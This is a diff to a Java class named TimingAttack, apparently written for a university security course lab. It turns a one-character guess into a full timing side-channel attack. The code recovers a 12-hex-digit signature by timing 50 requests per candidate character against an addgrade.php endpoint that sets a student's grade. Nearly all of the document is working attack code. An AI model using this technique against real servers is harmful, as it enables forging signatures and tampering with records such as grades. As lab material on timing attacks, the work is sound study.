@@ -10,61 +10,70 @@ public class TimingAttack {
 
 	public TimingAttack() {
 
-		URL url;
-		char[] alphabet = "abcdefghijklmnopqrstuvwxyz123456789".toCharArray();
-		URLConnection yc;
+		URL url = null;
+		char[] alphabet = "abcdef0123456789".toCharArray();
+		URLConnection yc = null;
 
 		StringBuilder a = null;
+		StringBuilder b = new StringBuilder("");
 
+		for (int k = 0; k < 12; k++) {
 
+			char currentBestGuess = 0;
 
-		
+			long longestTime = 0;
 
-		char valid = 0;
+			for (int i = 0; i < alphabet.length; i++) {
+				System.out.print(alphabet[i] + ", ");
 
-		long longestTime = 0;
+				long duration = 0;
+				long startTime = System.nanoTime();
 
-		for (int i = 0; i < alphabet.length; i++) {
+				for (int j = 0; j < 50; j++) {
 
-			long duration = 0;
-			long startTime = System.nanoTime();
+					try {
 
-			for (int j = 0; j < 20; j++) {
+						if (b.toString().equals("")) {
+							url = new URL(
+									"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature="
+											+ alphabet[i]);
+						} else {
+							url = new URL(
+									"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature="
+											+ b.toString() + alphabet[i]);
+						}
 
-				try {
-					url = new URL("https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature=6"
-							+ alphabet[i]);
-					yc = url.openConnection();
+						yc = url.openConnection();
 
-					BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream(), "UTF-8"));
-					String inputLine;
-					a = new StringBuilder();
-					while ((inputLine = in.readLine()) != null) {
-						a.append(inputLine);
+						BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream(), "UTF-8"));
+						String inputLine;
+						a = new StringBuilder();
+						while ((inputLine = in.readLine()) != null) {
+							a.append(inputLine);
+						}
+						in.close();
+
+					} catch (IOException e) {
+
+						e.printStackTrace();
 					}
-					in.close();
 
-				} catch (IOException e) {
+				}
 
-					e.printStackTrace();
+				long endTime = System.nanoTime();
+				duration = (endTime - startTime) / 50;
+
+				if (duration > longestTime) {
+					longestTime = duration;
+					currentBestGuess = alphabet[i];
 				}
 
 			}
-
-			long endTime = System.nanoTime();
-			duration = (endTime - startTime) / 20;
-
-			if (duration > longestTime) {
-				longestTime = duration;
-				valid = alphabet[i];
-			}
-
+			b.append(String.valueOf(currentBestGuess));
+			System.out.println("Best guess: " + currentBestGuess);
 		}
-
-		System.out.println(valid);
+		System.out.println(b.toString());
 	}
-
-
 
 	public void startAttack() {
 
